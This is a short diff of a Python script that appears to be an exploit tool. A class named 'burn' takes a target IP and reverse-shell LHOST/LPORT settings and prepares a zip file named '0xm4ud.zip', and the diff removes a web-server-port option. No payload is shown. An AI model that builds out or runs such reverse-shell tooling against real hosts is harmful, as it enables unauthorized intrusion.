@@ -17,7 +17,6 @@ class burn():
     self.target = options.target 
     self.lhost = options.lhost  
     self.lport = options.lport  
-    self.wport = options.wport  
     self.filename = "0xm4ud.zip"
     self.url = "http://" + self.target
 
@@ -62,7 +61,6 @@ def main():
   parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address")
   parser.add_option("-p", "--lport", dest="lport", default=str(60321), help="LPORT")
   parser.add_option("-l", "--lhost", dest="lhost", help="[ Requeired ] LHOST")  
-  parser.add_option("-w","--wport", dest="wport",default=443, help="WebServer Port") 
   (options, args) = parser.parse_args()  
   if options.target:  
     exploit = burn(options)  
